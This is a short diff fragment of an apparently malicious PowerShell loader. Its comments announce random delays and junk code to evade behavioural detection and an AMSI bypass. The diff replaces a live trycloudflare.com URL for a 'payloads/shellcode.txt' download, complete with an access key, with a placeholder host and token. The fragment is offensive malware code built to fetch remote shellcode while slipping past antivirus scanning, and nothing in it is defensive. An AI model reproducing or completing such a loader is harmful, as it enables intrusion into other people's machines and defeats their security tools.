@@ -2,7 +2,7 @@
 # Random delays and junk code to evade behavioral detection
 
 $x1=[Math]::PI;$x2=[Math]::E;$rnd=New-Object Random
-$u='https://dale-recently-shed-cup.trycloudflare.com/payloads/shellcode.txt?key=2cf7cbeab9fd5a21'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 # AMSI bypass with junk
